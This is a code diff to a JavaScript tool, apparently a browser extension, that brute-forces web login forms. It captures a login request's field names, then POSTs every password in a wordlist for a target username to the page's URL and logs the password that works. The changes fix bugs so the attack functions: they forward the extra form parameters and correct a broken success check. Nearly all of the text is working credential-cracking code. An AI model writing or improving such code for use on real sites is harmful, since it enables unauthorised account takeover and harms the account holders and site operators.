@@ -6,7 +6,6 @@ var failpattern;
 var crackuser;
 var wordlist;
 var msgHandler = () => {};
-var otherparms = "&";
 var cracked = false;
 
 function handleMessage(msg) {
@@ -61,6 +60,7 @@ function cracking_request_listener(e) {
     var pw_f;
     var badpasserror = failpattern;
     var iter;
+    var ops = "";
     data.body.forEach(body => {
       if(body.value === "UN") {
         un_f = body.name;
@@ -70,19 +70,20 @@ function cracking_request_listener(e) {
         pw_f = body.name;
       //  console.log("Pass Feild: " + pw_f);
       } else {
-        console.log("Other param: " + body.name);
-       otherparams = body.name + "=" + body.valuei + "&" + otherparams;
+        if ((body.value != "PW") && (body.value != "UN")) {
+          ops = ops.concat(body.name, "=", body.value, "&");
+        }
       }
-      console.log(otherparams);
     });
     console.log(e.originUrl);
     var wordbyline = wordlist.split("\n");
+      console.log(ops);
     for(iter = 0; iter < wordbyline.length-1; iter++) {
       var xhr = new XMLHttpRequest();
       xhr.open("POST", e.originUrl, true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send(un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
-      xhr.onload  = function crackit(iter) {
+      xhr.send(ops + un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
+      xhr.onload  = function() {
         var databack = this.responseText;
         if(databack.length < 5) {
           console.log("Error short page.");
@@ -92,12 +93,18 @@ function cracking_request_listener(e) {
         cracked = true;
         }
       }
-      if(cracked = true) {
+      if(cracked == true) {
         stop_cracking_listener();
         break;
       }
     }
-    console.log("Username: " + crackuser + " Password: " + wordbyline[iter]);
+    if(cracked == true) {
+      console.log("Username: " + crackuser + " Password: " + wordbyline[iter]);
+      stop_cracking_listener();
+    }
+    else {
+      console.log("Sorry, couldn't crack with this wordlist");
+    }
   });
 }
 
